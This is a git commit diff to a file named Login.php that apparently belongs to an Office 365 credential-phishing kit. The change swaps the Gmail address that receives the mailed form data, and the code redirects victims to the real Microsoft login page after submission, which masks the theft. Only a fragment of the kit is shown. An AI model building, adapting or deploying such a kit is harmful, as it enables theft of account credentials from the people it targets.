7c92b5e2ce9f4c259d349f31c6643b45fb8e0995
Bill Office <billingoffice237@gmail.com>
2019-06-13 00:33:24 +0000

    Intial commit

--- Login.php
+++ Login.php
@@ -5,7 +5,7 @@ if ($_POST['nextPrev(1)'])
 {// do the emailing commands here 
 header ("Location:https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1526372916&rver=6.7.6643.0&wp=MBI_SSL&wreply=https%3a%2f%2fproducts.office.com%2fen-ZA%2f%3fms.url%3doffice365com&lc=7177&id=290950&aadredir=1");
 }
-$to= "seekingablemen@gmail.com";
+$to= "obill8252@gmail.com";
 $subject ="2019 view";
 
 
